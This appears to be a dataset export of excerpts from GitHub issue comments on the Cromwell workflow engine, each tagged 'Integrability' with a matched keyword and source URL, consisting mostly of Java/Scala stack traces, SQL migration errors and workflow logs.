Integrability,ation.scala:47); 	at akka.http.scaladsl.util.FastFuture$.strictTransform$1(FastFuture.scala:41); 	at akka.http.scaladsl.util.FastFuture$.transformWith$extension1(FastFuture.scala:45); 	at akka.http.scaladsl.util.FastFuture$.flatMap$extension(FastFuture.scala:26); 	at akka.http.scaladsl.server.RouteConcatenation$RouteWithConcatenation.$anonfun$$tilde$1(RouteConcatenation.scala:44); 	at akka.http.scaladsl.server.RouteConcatenation$RouteWithConcatenation.$anonfun$$tilde$1(RouteConcatenation.scala:44); 	at akka.http.scaladsl.server.directives.BasicDirectives.$anonfun$mapRouteResultWith$2(BasicDirectives.scala:72); 	at akka.http.scaladsl.server.directives.BasicDirectives.$anonfun$textract$2(BasicDirectives.scala:159); 	at akka.http.scaladsl.server.directives.ExecutionDirectives.$anonfun$handleExceptions$2(ExecutionDirectives.scala:32); 	at akka.http.scaladsl.server.directives.BasicDirectives.$anonfun$textract$2(BasicDirectives.scala:159); 	at akka.http.scaladsl.server.Route$.$anonfun$asyncHandler$1(Route.scala:86); 	at akka.stream.impl.fusing.MapAsyncUnordered$$anon$26.onPush(Ops.scala:1303); 	at akka.stream.impl.fusing.GraphInterpreter.processPush(GraphInterpreter.scala:519); 	at akka.stream.impl.fusing.GraphInterpreter.execute(GraphInterpreter.scala:411); 	at akka.stream.impl.fusing.GraphInterpreterShell.runBatch(ActorGraphInterpreter.scala:588); 	at akka.stream.impl.fusing.GraphInterpreterShell$AsyncInput.execute(ActorGraphInterpreter.scala:472); 	at akka.stream.impl.fusing.GraphInterpreterShell.processEvent(ActorGraphInterpreter.scala:563); 	at akka.stream.impl.fusing.ActorGraphInterpreter.akka$stream$impl$fusing$ActorGraphInterpreter$$processEvent(ActorGraphInterpreter.scala:745); 	at akka.stream.impl.fusing.ActorGraphInterpreter$$anonfun$receive$1.applyOrElse(ActorGraphInterpreter.scala:760); 	at akka.actor.Actor.aroundReceive(Actor.scala:517); 	at akka.actor.Actor.aroundReceive$(Actor.scala:515); 	at akka.stream.impl.fusing.ActorGraphInterpreter.aroundReceive(Acto,MatchSource.ISSUE_COMMENT,broadinstitute,cromwell,87,https://github.com/broadinstitute/cromwell/issues/4676#issuecomment-467133187:4065,Rout,Route,4065,https://cromwell.readthedocs.io/en/latest/,https://github.com/broadinstitute/cromwell/issues/4676#issuecomment-467133187,1,['Rout'],['Route']
Integrability,"b where we expected ~900 files to be output and no memory issues were found and everything went relatively smoothly. Because of some outside factors we decided to change this task to instead output ~3000 files in the glob. After about 13000 tasks were processed(Sucess -> Done) we started seeing some slow down that coincided with errors in the logs like the following:. ```; 2016-08-03 03:34:04,971 cromwell-system-akka.actor.default-dispatcher-51 WARN - Caught exception, retrying: Remote host closed connection during handshake; javax.net.ssl.SSLHandshakeException: Remote host closed connection during handshake; at sun.security.ssl.SSLSocketImpl.readRecord(SSLSocketImpl.java:992) ~[na:1.8.0_72]; at sun.security.ssl.SSLSocketImpl.performInitialHandshake(SSLSocketImpl.java:1375) ~[na:1.8.0_72]; at sun.security.ssl.SSLSocketImpl.startHandshake(SSLSocketImpl.java:1403) ~[na:1.8.0_72]; at sun.security.ssl.SSLSocketImpl.startHandshake(SSLSocketImpl.java:1387) ~[na:1.8.0_72]; at sun.net.www.protocol.https.HttpsClient.afterConnect(HttpsClient.java:559) ~[na:1.8.0_72]; at sun.net.www.protocol.https.AbstractDelegateHttpsURLConnection.connect(AbstractDelegateHttpsURLConnection.java:185) ~[na:1.8.0_72]; at sun.net.www.protocol.https.HttpsURLConnectionImpl.connect(HttpsURLConnectionImpl.java:153) ~[na:1.8.0_72]; at com.google.api.client.http.javanet.NetHttpRequest.execute(NetHttpRequest.java:93) ~[cromwell.jar:0.19]; at com.google.api.client.http.HttpRequest.execute(HttpRequest.java:972) ~[cromwell.jar:0.19]; at com.google.api.client.googleapis.services.AbstractGoogleClientRequest.executeUnparsed(AbstractGoogleClientRequest.java:419) ~[cromwell.jar:0.19]; at com.google.api.client.googleapis.services.AbstractGoogleClientRequest.executeUnparsed(AbstractGoogleClientRequest.java:352) ~[cromwell.jar:0.19]; at com.google.api.client.googleapis.services.AbstractGoogleClientRequest.execute(AbstractGoogleClientRequest.java:469) ~[cromwell.jar:0.19]; at cromwell.engine.backend.io.filesystem.gc",MatchSource.ISSUE_COMMENT,broadinstitute,cromwell,87,https://github.com/broadinstitute/cromwell/issues/1248#issuecomment-237583201:1136,protocol,protocol,1136,https://cromwell.readthedocs.io/en/latest/,https://github.com/broadinstitute/cromwell/issues/1248#issuecomment-237583201,1,['protocol'],['protocol']
Integrability,"bys::cjllanwarne:; Reason: liquibase.exception.DatabaseException: Unknown column ':causedBy[]' in 'field list' [Failed SQL: INSERT INTO METADATA_ENTRY (WORKFLOW_EXECUTION_UUID, METADATA_KEY, CALL_FQN, JOB_SCATTER_INDEX, JOB_RETRY_ATTEMPT, METADATA_TIMESTAMP); SELECT t1.WORKFLOW_EXECUTION_UUID, CONCAT(TRIM(TRAILING ':message' FROM t1.METADATA_KEY), "":causedBy[]""), t1.CALL_FQN, t1.JOB_SCATTER_INDEX, t1.JOB_RETRY_ATTEMPT, t1.METADATA_TIMESTAMP; FROM METADATA_ENTRY AS t1; WHERE METADATA_KEY LIKE '%failures[%]%:message'; AND NOT EXISTS (SELECT *; 	FROM METADATA_ENTRY AS t2; 	WHERE t2.WORKFLOW_EXECUTION_UUID = t1.WORKFLOW_EXECUTION_UUID; 	 AND (t2.CALL_FQN = t1.CALL_FQN OR (t2.CALL_FQN IS NULL AND t1.CALL_FQN IS NULL)); 	 AND (t2.JOB_SCATTER_INDEX = t1.JOB_SCATTER_INDEX OR (t2.JOB_SCATTER_INDEX IS NULL AND t1.JOB_SCATTER_INDEX IS NULL)); 	 AND (t2.JOB_RETRY_ATTEMPT = t1.JOB_RETRY_ATTEMPT OR (t2.JOB_RETRY_ATTEMPT IS NULL AND t1.JOB_RETRY_ATTEMPT IS NULL)); AND t2.METADATA_KEY LIKE CONCAT(TRIM(TRAILING ':message' FROM t1.METADATA_KEY), "":causedBy[%""); AND t2.METADATA_JOURNAL_ID <> t1.METADATA_JOURNAL_ID; )]; 	at liquibase.changelog.ChangeSet.execute(ChangeSet.java:619); 	at liquibase.changelog.visitor.UpdateVisitor.visit(UpdateVisitor.java:51); 	at liquibase.changelog.ChangeLogIterator.run(ChangeLogIterator.java:79); 	at liquibase.Liquibase.update(Liquibase.java:214); 	at liquibase.Liquibase.update(Liquibase.java:192); 	at cromwell.database.migration.liquibase.LiquibaseUtils$.updateSchema(LiquibaseUtils.scala:62); 	at cromwell.database.migration.liquibase.LiquibaseUtils$.updateSchema(LiquibaseUtils.scala:34); 	at cromwell.services.ServicesStore$EnhancedSqlDatabase$.$anonfun$initialized$1(ServicesStore.scala:11); 	at cromwell.services.ServicesStore$EnhancedSqlDatabase$.$anonfun$initialized$1$adapted(ServicesStore.scala:11); 	at cromwell.database.slick.SlickDatabase.$anonfun$withConnection$1(SlickDatabase.scala:155); 	at slick.jdbc.SimpleJdbcAction.run(StreamingInvokerAction.",MatchSource.ISSUE_COMMENT,broadinstitute,cromwell,87,https://github.com/broadinstitute/cromwell/issues/4606#issuecomment-459609701:2884,message,message,2884,https://cromwell.readthedocs.io/en/latest/,https://github.com/broadinstitute/cromwell/issues/4606#issuecomment-459609701,1,['message'],['message']
Integrability,"c754c8936/src/jdk.scripting.nashorn/share/classes/jdk/nashorn/internal/runtime/linker/JSObjectLinker.java#l87. The BeanLinker generates the dynamic call to the map getter:. - https://github.com/JetBrains/jdk8u_nashorn/blob/jdk8u76-b03/src/jdk/internal/dynalink/beans/BeanLinker.java#L179-L205; - http://hg.openjdk.java.net/jdk9/jdk9/nashorn/file/17cc754c8936/src/jdk.dynalink/share/classes/jdk/dynalink/beans/BeanLinker.java#l218; */; final String expr = expr(; ""print('testKeyMapNonString hello ' + obj[true]);"",; ""obj;""; );; final Map<Object, Object> obj = Collections.singletonMap(true, ""world"");; final Map<String, Object> args = Collections.singletonMap(""obj"", obj);; eval(expr, args);; }. /**; * Fail to stringify a java.util.Map.; */; private static void testStringifyMap() throws ScriptException {; /*; Nashorn's JSON.stringify identifies that a map is an object, but doesn't convert Java maps (nor Java arrays) to; a string. NOTE: There has been some work in jdk8u and jdk9 to fix issues with stringify, so the code varies a; bit depending on the jdk version. - https://github.com/JetBrains/jdk8u_nashorn/blob/jdk8u76-b03/src/jdk/nashorn/internal/objects/NativeJSON.java#L267-L272; - http://hg.openjdk.java.net/jdk9/jdk9/nashorn/file/17cc754c8936/src/jdk.scripting.nashorn/share/classes/jdk/nashorn/internal/objects/NativeJSON.java#l288. Maps do get special treatment in Nashorn and are passed around internally:. - https://wiki.openjdk.java.net/display/Nashorn/Nashorn+extensions#Nashornextensions-SpecialtreatmentofobjectsofspecificJavaclasses. In this case the value within NativeJSON.str() is the Java map instance and not a ScriptObject nor a JSObject.; Thus the code falls through and returns UNDEFINED. If the code didn't bypass the if-statement the block would; run NativeJSON.JO() and attempt to get the value's keys. - https://github.com/JetBrains/jdk8u_nashorn/blob/jdk8u76-b03/src/jdk/nashorn/internal/objects/NativeJSON.java#L287; - http://hg.openjdk.java.net/jdk9/jdk9/nashorn/f",MatchSource.ISSUE_COMMENT,broadinstitute,cromwell,87,https://github.com/broadinstitute/cromwell/issues/3090#issuecomment-355634573:7165,depend,depending,7165,https://cromwell.readthedocs.io/en/latest/,https://github.com/broadinstitute/cromwell/issues/3090#issuecomment-355634573,1,['depend'],['depending']
Integrability,"cificity_oncotate_oncotated_target_seg_gt_file"": ""gs://broad-dsde-methods/cromwell-executions-eval-gatk-protected/crsp_validation_workflow/020aa0e3-d12f-4085-b8a7-1de06c8df598/call-specificity_oncotate/SM-74ND9.per_target.oncotated.txt"",; ""crsp_validation_workflow_specificity_run_sensitivity_precision_small_sens_file"": ""gs://broad-dsde-methods/cromwell-executions-eval-gatk-protected/crsp_validation_workflow/020aa0e3-d12f-4085-b8a7-1de06c8df598/call-specificity_run_sensitivity_precision/SM-74ND9.sens_prec.small_segs.tsv"",; ""crsp_validation_workflow_specificity_run_sensitivity_precision_del_sens_prec_file"": ""gs://broad-dsde-methods/cromwell-executions-eval-gatk-protected/crsp_validation_workflow/020aa0e3-d12f-4085-b8a7-1de06c8df598/call-specificity_run_sensitivity_precision/SM-74ND9.sens_prec.del.tsv""; },; ""id"": ""020aa0e3-d12f-4085-b8a7-1de06c8df598""; }; [INFO] [12/08/2016 21:02:52.660] [cromwell-system-akka.actor.default-dispatcher-3] [akka://cromwell-system/user/SingleWorkflowRunnerActor] SingleWorkflowRunnerActor writing metadata to /home/lichtens/test_eval/crsp_validation_input_files/crsp_validation_from_cromwell.json.metadata.json; [INFO] [12/08/2016 21:02:52.719] [shutdownHook1] [akka://cromwell-system/user/SingleWorkflowRunnerActor/WorkflowManagerActor] WorkflowManagerActor: Received shutdown signal.; [INFO] [12/08/2016 21:02:52.720] [cromwell-system-akka.actor.default-dispatcher-34] [akka://cromwell-system/deadLetters] Message [cromwell.engine.workflow.WorkflowManagerActor$AbortAllWorkflowsCommand$] from Actor[akka://cromwell-system/deadLetters] to Actor[akka://cromwell-system/deadLetters] was not delivered. [2] dead letters encountered. This logging can be turned off or adjusted with configuration settings 'akka.log-dead-letters' and 'akka.log-dead-letters-during-shutdown'.; Capturing latest dir...; 7d822ec4-ca21-4e05-94ad-9d16acd5e534; lichtens@lichtens-big:~/test_eval$; ```. Do you see it? Look at that last line! It's a prompt! Cromwell exited successfully!",MatchSource.ISSUE_COMMENT,broadinstitute,cromwell,87,https://github.com/broadinstitute/cromwell/issues/1649#issuecomment-266019352:3260,Message,Message,3260,https://cromwell.readthedocs.io/en/latest/,https://github.com/broadinstitute/cromwell/issues/1649#issuecomment-266019352,1,['Message'],['Message']
Integrability,"ctor.scala:136); at akka.actor.ActorCell.receiveMessage(ActorCell.scala:527); at akka.actor.ActorCell.invoke(ActorCell.scala:496); at akka.dispatch.Mailbox.processMailbox(Mailbox.scala:257); at akka.dispatch.Mailbox.run(Mailbox.scala:224); at akka.dispatch.Mailbox.exec(Mailbox.scala:234); at akka.dispatch.forkjoin.ForkJoinTask.doExec(ForkJoinTask.java:260); at akka.dispatch.forkjoin.ForkJoinPool$WorkQueue.runTask(ForkJoinPool.java:1339); at akka.dispatch.forkjoin.ForkJoinPool.runWorker(ForkJoinPool.java:1979); at akka.dispatch.forkjoin.ForkJoinWorkerThread.run(ForkJoinWorkerThread.java:107). [2017-12-05 20:11:24,83] [warn] Couldn't find a suitable DSN, defaulting to a Noop one.; [2017-12-05 20:11:24,84] [info] Using noop to send events.; [2017-12-05 20:11:24,85] [info] WorkflowManagerActor WorkflowActor-159210e6-fa6a-4a99-b386-5931ae245324 is in a terminal state: WorkflowFailedState; [2017-12-05 20:11:32,22] [info] SingleWorkflowRunnerActor workflow finished with status 'Failed'.; [2017-12-05 20:11:32,25] [info] Message [cromwell.core.actor.StreamActorHelper$StreamFailed] without sender to Actor[akka://cromwell-system/deadLetters] was not delivered. [1] dead letters encountered. This logging can be turned off or adjusted with configuration settings 'akka.log-dead-letters' and 'akka.log-dead-letters-during-shutdown'.; [2017-12-05 20:11:32,26] [info] Message [cromwell.core.actor.StreamActorHelper$StreamFailed] without sender to Actor[akka://cromwell-system/deadLetters] was not delivered. [2] dead letters encountered. This logging can be turned off or adjusted with configuration settings 'akka.log-dead-letters' and 'akka.log-dead-letters-during-shutdown'.; Workflow 159210e6-fa6a-4a99-b386-5931ae245324 transitioned to state Failed; [2017-12-05 20:11:32,30] [info] Automatic shutdown of the async connection; [2017-12-05 20:11:32,30] [info] Gracefully shutdown sentry threads.; [2017-12-05 20:11:32,30] [info] Shutdown finished.; ```; This code worked with `cromwell-29.jar`.",MatchSource.ISSUE_COMMENT,broadinstitute,cromwell,87,https://github.com/broadinstitute/cromwell/issues/2992#issuecomment-349527406:5992,Message,Message,5992,https://cromwell.readthedocs.io/en/latest/,https://github.com/broadinstitute/cromwell/issues/2992#issuecomment-349527406,2,['Message'],['Message']
Integrability,d out; java.net.SocketTimeoutException: Read timed out; at java.net.SocketInputStream.socketRead0(Native Method); at java.net.SocketInputStream.socketRead(SocketInputStream.java:116); at java.net.SocketInputStream.read(SocketInputStream.java:170); at java.net.SocketInputStream.read(SocketInputStream.java:141); at sun.security.ssl.InputRecord.readFully(InputRecord.java:465); at sun.security.ssl.InputRecord.read(InputRecord.java:503); at sun.security.ssl.SSLSocketImpl.readRecord(SSLSocketImpl.java:973); at sun.security.ssl.SSLSocketImpl.readDataRecord(SSLSocketImpl.java:930); at sun.security.ssl.AppInputStream.read(AppInputStream.java:105); at java.io.BufferedInputStream.fill(BufferedInputStream.java:246); at java.io.BufferedInputStream.read1(BufferedInputStream.java:286); at java.io.BufferedInputStream.read(BufferedInputStream.java:345); at sun.net.www.http.HttpClient.parseHTTPHeader(HttpClient.java:704); at sun.net.www.http.HttpClient.parseHTTP(HttpClient.java:647); at sun.net.www.protocol.http.HttpURLConnection.getInputStream0(HttpURLConnection.java:1536); at sun.net.www.protocol.http.HttpURLConnection.getInputStream(HttpURLConnection.java:1441); at java.net.HttpURLConnection.getResponseCode(HttpURLConnection.java:480); at sun.net.www.protocol.https.HttpsURLConnectionImpl.getResponseCode(HttpsURLConnectionImpl.java:338); at com.google.api.client.http.javanet.NetHttpResponse.<init>(NetHttpResponse.java:37); at com.google.api.client.http.javanet.NetHttpRequest.execute(NetHttpRequest.java:94); at com.google.api.client.http.HttpRequest.execute(HttpRequest.java:972); at com.google.api.client.googleapis.batch.BatchRequest.execute(BatchRequest.java:241); at cromwell.backend.impl.jes.statuspolling.JesPollingActor.runBatch(JesPollingActor.scala:67); at cromwell.backend.impl.jes.statuspolling.JesPollingActor.cromwell$backend$impl$jes$statuspolling$JesPollingActor$$handleBatch(JesPollingActor.scala:58); at cromwell.backend.impl.jes.statuspolling.JesPollingActor$$anonfun$receiv,MatchSource.ISSUE_COMMENT,broadinstitute,cromwell,87,https://github.com/broadinstitute/cromwell/issues/1631#issuecomment-256938948:2756,protocol,protocol,2756,https://cromwell.readthedocs.io/en/latest/,https://github.com/broadinstitute/cromwell/issues/1631#issuecomment-256938948,1,['protocol'],['protocol']
Integrability,depends on #3726,MatchSource.ISSUE_COMMENT,broadinstitute,cromwell,87,https://github.com/broadinstitute/cromwell/issues/3708#issuecomment-394475430:0,depend,depends,0,https://cromwell.readthedocs.io/en/latest/,https://github.com/broadinstitute/cromwell/issues/3708#issuecomment-394475430,1,['depend'],['depends']
Integrability,"dispatch.Mailbox.processMailbox(Mailbox.scala:257); at akka.dispatch.Mailbox.run(Mailbox.scala:224); at akka.dispatch.Mailbox.exec(Mailbox.scala:234); at scala.concurrent.forkjoin.ForkJoinTask.doExec(ForkJoinTask.java:260); at scala.concurrent.forkjoin.ForkJoinPool$WorkQueue.runTask(ForkJoinPool.java:1339); at scala.concurrent.forkjoin.ForkJoinPool.runWorker(ForkJoinPool.java:1979); at scala.concurrent.forkjoin.ForkJoinWorkerThread.run(ForkJoinWorkerThread.java:107). [2016-10-28 14:38:11,89] [warn] 1 failures fetching JES statuses: {""domain"":""global"",""message"":""Deadline expired before operation could complete."",""reason"":""backendError""}; [2016-10-28 14:38:11,89] [warn] JesAsyncBackendJobExecutionActor [a3dd8163case_gatk_acnv_workflow.AllelicCNV:7:1]: Caught exception, retrying:; java.io.IOException: Google request failed: {; ""code"" : 504,; ""errors"" : [ {; ""domain"" : ""global"",; ""message"" : ""Deadline expired before operation could complete."",; ""reason"" : ""backendError""; } ],; ""message"" : ""Deadline expired before operation could complete."",; ""status"" : ""DEADLINE_EXCEEDED""; }; at cromwell.backend.impl.jes.statuspolling.JesPollingActorClient$$anonfun$pollingActorClientReceive$1.applyOrElse(JesPollingActorClient.scala:30); at scala.PartialFunction$OrElse.applyOrElse(PartialFunction.scala:170); at akka.actor.Actor$class.aroundReceive(Actor.scala:484); at cromwell.backend.impl.jes.JesAsyncBackendJobExecutionActor.aroundReceive(JesAsyncBackendJobExecutionActor.scala:82); at akka.actor.ActorCell.receiveMessage(ActorCell.scala:526); at akka.actor.ActorCell.invoke(ActorCell.scala:495); at akka.dispatch.Mailbox.processMailbox(Mailbox.scala:257); at akka.dispatch.Mailbox.run(Mailbox.scala:224); at akka.dispatch.Mailbox.exec(Mailbox.scala:234); at scala.concurrent.forkjoin.ForkJoinTask.doExec(ForkJoinTask.java:260); at scala.concurrent.forkjoin.ForkJoinPool$WorkQueue.runTask(ForkJoinPool.java:1339); at scala.concurrent.forkjoin.ForkJoinPool.runWorker(ForkJoinPool.java:1979); at scal",MatchSource.ISSUE_COMMENT,broadinstitute,cromwell,87,https://github.com/broadinstitute/cromwell/issues/1631#issuecomment-256938948:11372,message,message,11372,https://cromwell.readthedocs.io/en/latest/,https://github.com/broadinstitute/cromwell/issues/1631#issuecomment-256938948,1,['message'],['message']
Integrability,"dtype size changed, may indicate binary incompatibility. Expected 96, got 88; from pandas._libs import algos, lib, writers as libwriters; /usr/local/share/bcbio-nextgen/anaconda/lib/python2.7/site-packages/gffutils/interface.py:161: UserWarning: It appears that this database has not had the ANALYZE sqlite3 command run on it. Doing so can dramatically speed up queries, and is done by default for databases created with gffutils >0.8.7.1 (this database was created with version 0.8.2) Consider calling the analyze() method of this object.; ""method of this object."" % self.version); Traceback (most recent call last):; File ""/usr/local/bin/bcbio_nextgen.py"", line 223, in <module>; runfn.process(kwargs[""args""]); File ""/usr/local/share/bcbio-nextgen/anaconda/lib/python2.7/site-packages/bcbio/distributed/runfn.py"", line 58, in process; out = fn(fnargs); File ""/usr/local/share/bcbio-nextgen/anaconda/lib/python2.7/site-packages/bcbio/utils.py"", line 52, in wrapper; return apply(f, *args, **kwargs); File ""/usr/local/share/bcbio-nextgen/anaconda/lib/python2.7/site-packages/bcbio/distributed/multitasks.py"", line 208, in pipeline_summary; return qcsummary.pipeline_summary(*args); File ""/usr/local/share/bcbio-nextgen/anaconda/lib/python2.7/site-packages/bcbio/pipeline/qcsummary.py"", line 70, in pipeline_summary; data[""summary""] = _run_qc_tools(work_bam, work_data); File ""/usr/local/share/bcbio-nextgen/anaconda/lib/python2.7/site-packages/bcbio/pipeline/qcsummary.py"", line 162, in _run_qc_tools; out = qc_fn(bam_file, data, cur_qc_dir); File ""/usr/local/share/bcbio-nextgen/anaconda/lib/python2.7/site-packages/bcbio/qc/qualimap.py"", line 347, in run_rnaseq; metrics = _parse_metrics(metrics); File ""/usr/local/share/bcbio-nextgen/anaconda/lib/python2.7/site-packages/bcbio/qc/qualimap.py"", line 210, in _parse_metrics; out.update({name: float(metrics[name])}); TypeError: float() argument must be a string or a number; ```. This is what the command Cromwell generated looks like:. ```; 'bcbio_",MatchSource.ISSUE_COMMENT,broadinstitute,cromwell,87,https://github.com/broadinstitute/cromwell/issues/3724#issuecomment-436054277:5021,wrap,wrapper,5021,https://cromwell.readthedocs.io/en/latest/,https://github.com/broadinstitute/cromwell/issues/3724#issuecomment-436054277,1,['wrap'],['wrapper']
Integrability,"e"": false,; ""executionStatus"": ""Failed"",; ""stdout"": ""gs://broad-gotc-prod-storage/cromwell_execution/PairedEndSingleSampleWorkflow/129f0510-5d6b-4c4c-b266-116a9a52f325/call-CollectQualityYieldMetrics/shard-2/CollectQualityYieldMetrics-2-stdout.log"",; ""backendStatus"": ""Failed"",; ""shardIndex"": 2,; ""outputs"": {. },; ""runtimeAttributes"": {; ""preemptible"": ""0"",; ""failOnStderr"": ""false"",; ""bootDiskSizeGb"": ""10"",; ""disks"": ""local-disk 100 HDD"",; ""continueOnReturnCode"": ""0"",; ""docker"": ""broadinstitute/genomes-in-the-cloud:2.0.0"",; ""cpu"": ""1"",; ""zones"": ""us-central1-c"",; ""memory"": ""2 GB""; },; ""cache"": {; ""allowResultReuse"": true; },; ""inputs"": {; ""disk_size"": ""flowcell_small_disk"",; ""input_bam"": ""unmapped_bam"",; ""metrics_filename"": ""sub(sub(unmapped_bam, sub_strip_path, \""\""), sub_strip_unmapped, \""\"") + \"".unmapped.quality_yield_metrics\""""; },; ""failures"": [{; ""failure"": ""Task 129f0510-5d6b-4c4c-b266-116a9a52f325:CollectQualityYieldMetrics failed: error code 10. Message: 13: VM ggp-12606127296447203756 shut down unexpectedly."",; ""timestamp"": ""2016-04-24T20:04:45.145Z""; }],; ""jobId"": ""operations/EIXH28fEKhisk93Qxr_9-K4BIJ-ikOmeDSoPcHJvZHVjdGlvblF1ZXVl"",; ""backend"": ""JES"",; ""end"": ""2016-04-24T20:04:45.000Z"",; ""stderr"": ""gs://broad-gotc-prod-storage/cromwell_execution/PairedEndSingleSampleWorkflow/129f0510-5d6b-4c4c-b266-116a9a52f325/call-CollectQualityYieldMetrics/shard-2/CollectQualityYieldMetrics-2-stderr.log"",; ""attempt"": 1,; ""executionEvents"": [],; ""backendLogs"": {; ""log"": ""gs://broad-gotc-prod-storage/cromwell_execution/PairedEndSingleSampleWorkflow/129f0510-5d6b-4c4c-b266-116a9a52f325/call-CollectQualityYieldMetrics/shard-2/CollectQualityYieldMetrics-2.log""; },; ""start"": ""2016-04-24T15:50:19.000Z""; }. ```. Log stack trace: . ```; 3589853:2016-04-24 20:04:45,142 cromwell-system-akka.actor.default-dispatcher-16 INFO - JES Run [UUID(129f0510):CollectQualityYieldMetrics:2]: Status change from Running to Failed; 3589854:2016-04-24 20:04:45,145 cromwell-system-akka.actor.defau",MatchSource.ISSUE_COMMENT,broadinstitute,cromwell,87,https://github.com/broadinstitute/cromwell/issues/744#issuecomment-215222862:1134,Message,Message,1134,https://cromwell.readthedocs.io/en/latest/,https://github.com/broadinstitute/cromwell/issues/744#issuecomment-215222862,1,['Message'],['Message']
Integrability,"e1$1(Future.scala:24) ~[cromwell.jar:0.19]; 3589860- at scala.concurrent.impl.Future$PromiseCompletingRunnable.run_aroundBody0(Future.scala:24) ~[cromwell.jar:0.19]; 3589861- at scala.concurrent.impl.Future$PromiseCompletingRunnable$AjcClosure1.run(Future.scala:1) ~[cromwell.jar:0.19]; 3589862- at org.aspectj.runtime.reflect.JoinPointImpl.proceed(JoinPointImpl.java:149) ~[cromwell.jar:0.19]; 3589863- at kamon.scala.instrumentation.FutureInstrumentation$$anonfun$aroundExecution$1.apply(FutureInstrumentation.scala:44) ~[cromwell.jar:0.19]; 3589864- at kamon.trace.Tracer$.withContext(TracerModule.scala:53) ~[cromwell.jar:0.19]; 3589865- at kamon.scala.instrumentation.FutureInstrumentation.aroundExecution(FutureInstrumentation.scala:43) ~[cromwell.jar:0.19]; 3589866- at scala.concurrent.impl.Future$PromiseCompletingRunnable.run(Future.scala:23) ~[cromwell.jar:0.19]; 3589867- at akka.dispatch.TaskInvocation.run(AbstractDispatcher.scala:40) ~[cromwell.jar:0.19]; 3589868- at akka.dispatch.ForkJoinExecutorConfigurator$AkkaForkJoinTask.exec(AbstractDispatcher.scala:397) [cromwell.jar:0.19]; 3589869- at scala.concurrent.forkjoin.ForkJoinTask.doExec(ForkJoinTask.java:260) [cromwell.jar:0.19]; 3589870- at scala.concurrent.forkjoin.ForkJoinPool$WorkQueue.runTask(ForkJoinPool.java:1339) [cromwell.jar:0.19]; 3589871- at scala.concurrent.forkjoin.ForkJoinPool.runWorker(ForkJoinPool.java:1979) [cromwell.jar:0.19]; 3589872- at scala.concurrent.forkjoin.ForkJoinWorkerThread.run(ForkJoinWorkerThread.java:107) [cromwell.jar:0.19]; 3589873:2016-04-24 20:04:45,145 cromwell-system-akka.actor.default-dispatcher-16 INFO - WorkflowActor [UUID(129f0510)]: persisting status of CollectQualityYieldMetrics:2 to Failed.; 3589874:2016-04-24 20:04:45,145 cromwell-system-akka.actor.default-dispatcher-16 ERROR - WorkflowActor [UUID(129f0510)]: Task 129f0510-5d6b-4c4c-b266-116a9a52f325:CollectQualityYieldMetrics failed: error code 10. Message: 13: VM ggp-12606127296447203756 shut down unexpectedly.; ```",MatchSource.ISSUE_COMMENT,broadinstitute,cromwell,87,https://github.com/broadinstitute/cromwell/issues/744#issuecomment-215222862:5019,Message,Message,5019,https://cromwell.readthedocs.io/en/latest/,https://github.com/broadinstitute/cromwell/issues/744#issuecomment-215222862,1,['Message'],['Message']
Integrability,"e_metadata.xml::guaranteed_caused_bys::cjllanwarne failed. Error: Unknown column ':causedBy[]' in 'field list' [Failed SQL: INSERT INTO METADATA_ENTRY (WORKFLOW_EXECUTION_UUID, METADATA_KEY, CALL_FQN, JOB_SCATTER_INDEX, JOB_RETRY_ATTEMPT, METADATA_TIMESTAMP); SELECT t1.WORKFLOW_EXECUTION_UUID, CONCAT(TRIM(TRAILING ':message' FROM t1.METADATA_KEY), "":causedBy[]""), t1.CALL_FQN, t1.JOB_SCATTER_INDEX, t1.JOB_RETRY_ATTEMPT, t1.METADATA_TIMESTAMP; FROM METADATA_ENTRY AS t1; WHERE METADATA_KEY LIKE '%failures[%]%:message'; AND NOT EXISTS (SELECT *; 	FROM METADATA_ENTRY AS t2; 	WHERE t2.WORKFLOW_EXECUTION_UUID = t1.WORKFLOW_EXECUTION_UUID; 	 AND (t2.CALL_FQN = t1.CALL_FQN OR (t2.CALL_FQN IS NULL AND t1.CALL_FQN IS NULL)); 	 AND (t2.JOB_SCATTER_INDEX = t1.JOB_SCATTER_INDEX OR (t2.JOB_SCATTER_INDEX IS NULL AND t1.JOB_SCATTER_INDEX IS NULL)); 	 AND (t2.JOB_RETRY_ATTEMPT = t1.JOB_RETRY_ATTEMPT OR (t2.JOB_RETRY_ATTEMPT IS NULL AND t1.JOB_RETRY_ATTEMPT IS NULL)); AND t2.METADATA_KEY LIKE CONCAT(TRIM(TRAILING ':message' FROM t1.METADATA_KEY), "":causedBy[%""); AND t2.METADATA_JOURNAL_ID <> t1.METADATA_JOURNAL_ID; )]; 2019-01-31 20:30:56,617 INFO - changesets/failure_metadata.xml::guaranteed_caused_bys::cjllanwarne: Successfully released change log lock; 2019-01-31 20:30:56,631 ERROR - Failed to instantiate Cromwell System. Shutting down Cromwell.; liquibase.exception.MigrationFailedException: Migration failed for change set changesets/failure_metadata.xml::guaranteed_caused_bys::cjllanwarne:; Reason: liquibase.exception.DatabaseException: Unknown column ':causedBy[]' in 'field list' [Failed SQL: INSERT INTO METADATA_ENTRY (WORKFLOW_EXECUTION_UUID, METADATA_KEY, CALL_FQN, JOB_SCATTER_INDEX, JOB_RETRY_ATTEMPT, METADATA_TIMESTAMP); SELECT t1.WORKFLOW_EXECUTION_UUID, CONCAT(TRIM(TRAILING ':message' FROM t1.METADATA_KEY), "":causedBy[]""), t1.CALL_FQN, t1.JOB_SCATTER_INDEX, t1.JOB_RETRY_ATTEMPT, t1.METADATA_TIMESTAMP; FROM METADATA_ENTRY AS t1; WHERE METADATA_KEY LIKE '%failures[%]%:messag",MatchSource.ISSUE_COMMENT,broadinstitute,cromwell,87,https://github.com/broadinstitute/cromwell/issues/4606#issuecomment-459609701:1402,message,message,1402,https://cromwell.readthedocs.io/en/latest/,https://github.com/broadinstitute/cromwell/issues/4606#issuecomment-459609701,1,['message'],['message']
